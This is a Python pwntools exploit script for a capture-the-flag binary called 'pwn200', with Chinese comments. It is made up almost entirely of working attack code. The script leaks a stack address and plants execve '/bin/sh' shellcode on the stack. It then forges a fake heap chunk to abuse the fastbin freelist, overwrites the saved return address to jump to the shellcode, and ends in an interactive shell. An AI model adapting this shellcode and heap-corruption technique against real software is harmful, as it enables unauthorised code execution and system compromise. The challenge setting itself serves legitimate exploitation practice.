#encoding:utf-8
from pwn import *

#r = remote('127.0.0.1', 6666)
p = process("./pwn200")

shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

def pwn():
    # gdb.attach(p, "b *0x400991")

    data = shellcode.ljust(46, 'a')
    data += 'bb'
    p.send(data)
    p.recvuntil('bb')
    rbp_addr = p.recvuntil(', w')[:-3]
    rbp_addr = u64(rbp_addr.ljust(8,'\x00'))
    print hex(rbp_addr)

    fake_addr = rbp_addr - 0x90
    shellcode_addr = rbp_addr - 0x50
    # 输入id伪造下一个堆块的size
    p.recvuntil('id ~~?')
    p.sendline('32')

    p.recvuntil('money~')
    data = p64(0) * 5 + p64(0x41) # 伪造堆块的size
    data = data.ljust(0x38, '\x00') + p64(fake_addr) # 覆盖堆指针
    p.send(data)

    p.recvuntil('choice : ')
    p.sendline('2') # 释放伪堆块进入fastbin

    p.recvuntil('choice : ')
    p.sendline('1')
    p.recvuntil('long?')
    p.sendline('48')
    p.recvuntil('\n48\n') # 将伪堆块申请出来
    data = 'a' * 0x18 + p64(shellcode_addr) # 将eip修改为shellcode的地址
    data = data.ljust(48, '\x00')
    p.send(data)
    p.recvuntil('choice : ')
    p.sendline('3') # 退出返回时回去执行shellcode

    p.interactive()

if __name__ == '__main__':
    pwn()
